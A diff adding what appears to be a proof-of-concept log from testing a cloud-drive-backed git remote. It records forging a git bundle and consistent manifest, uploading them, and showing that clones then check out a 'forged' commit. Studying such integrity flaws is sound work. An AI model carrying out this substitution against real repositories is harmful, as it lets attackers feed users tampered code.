@@ -1,0 +1,47 @@
+=== exact bytes of real manifest (non-secret: it is a filename) ===
+0000160   7   3   c   1   e   e   7   9   a   e   4   2   8   8   7   8
+0000200   1   5   0   6   0   3   1   1   6   c   8   d  \n
+0000215
+=== craft forged bundle ===
+forged_bundle_name=GITBUNDLE-s331--4c20f00b-9ec3-4457-b5b3-7f3e0c52d7d6-3b4b816e9c3f4e1e23a9c2f6cbdd6e985696d6c3e2185f233ece9ecf275395ae
+forged_bundle_sha=3b4b816e9c3f4e1e23a9c2f6cbdd6e985696d6c3e2185f233ece9ecf275395ae size=331
+### remove old garbage fake manifest first (1kR5oHs0...)
+op=delete
+target=1kR5oHs0fSjwZO7sINDPqRXLEl5HNMRH3
+http=204
+### C creates forged bundle (content from /work/forge.bundle)
+op=create-file
+name=GITBUNDLE-s331--4c20f00b-9ec3-4457-b5b3-7f3e0c52d7d6-3b4b816e9c3f4e1e23a9c2f6cbdd6e985696d6c3e2185f233ece9ecf275395ae
+parent=1IP1mlfMuF4lrV53juSyPINrItax9g72I
+http=200
+file_id=14SUvZKgdiiLr_vU1GTOe5qyPeNwtA7LD
+md5=ae5819a6b9bc9c9cc499f3f3a01d0118
+### C creates consistent fake GITMANIFEST pointing to forged bundle
+op=create-file
+name=GITMANIFEST--4c20f00b-9ec3-4457-b5b3-7f3e0c52d7d6
+parent=1IP1mlfMuF4lrV53juSyPINrItax9g72I
+http=200
+file_id=1nFYsQFswX20bmGebeffNj-O-oxmXTgxn
+md5=55fbfd3d18ca68036c1996153dcfc930
+=== clone with CONSISTENT forged manifest+bundle pair ===
+=== clone with CONSISTENT forged manifest+bundle (internal timeout 150s) ===
+Cloning into '/work/attack-clone-forged'...
+2026/09/26 08:31:56 ERROR : Failed to save config after 10 tries: failed to create temp file for new config: open /secrets/rclone-committer.conf1416139987: permission denied
+clone_rc=0 (124 = 逾時)
+HEAD=81dd57a90134e31512e6ab88d981083744b8c1c4
+81dd57a forged
+FORGED.txt
+=== name resolution: which manifest does rclone cat pick? ===
+GITBUNDLE-s331--4c20f00b-9ec3-4457-b5b3-7f3e0c52d7d6-3b4b816e9c3f4e1e23a9c2f6cbdd6e985696d6c3e2185f233ece9ecf275395ae
+GITBUNDLE-s395--4c20f00b-9ec3-4457-b5b3-7f3e0c52d7d6-93a4e2d836810fe76f6e461a4b4ca6e63e9073c1ee79ae428878150603116c8d
+=== second clone (determinism check) ===
+Cloning into '/work/attack-clone-forged2'...
+2026/09/26 08:32:31 ERROR : Failed to save config after 10 tries: failed to create temp file for new config: open /secrets/rclone-committer.conf4179752635: permission denied
+clone2_rc=0
+81dd57a forged
+=== push from the ORIGINAL real repo with forged pair present ===
+hint: Updates were rejected because the tip of your current branch is behind
+hint: its remote counterpart. If you want to integrate the remote changes,
+hint: use 'git pull' before pushing again.
+hint: See the 'Note about fast-forwards' in 'git push --help' for details.
+push_rc=1
